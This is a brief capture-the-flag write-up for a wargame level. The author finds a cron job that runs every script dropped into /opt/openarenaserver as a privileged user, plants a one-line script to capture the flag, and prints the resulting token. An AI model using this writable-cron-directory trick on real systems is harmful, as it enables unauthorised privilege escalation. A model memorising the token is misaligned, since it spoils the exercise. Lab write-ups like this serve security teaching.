# First step

When started level05, we have a 'you have new mail' message in the terminal.

```shell
You have new mail.
$>
```

So we can check to /var/mail, and we have a level05 file.
```shell
$> cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05  

$> cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

We can know every 2 minutes, we run every file in the folder /opt/openarenaserver/ and delete it.  

# Second step

We can create a script file in the folder /opt/openarenaserver/.  

```shell
$> echo 'getflag > /tmp/flag' > /opt/openarenaserver/flag.sh && sleep 120

$> cat /tmp/flag
Check flag.Here is your token : viuaaale9huek52boumoomioc
```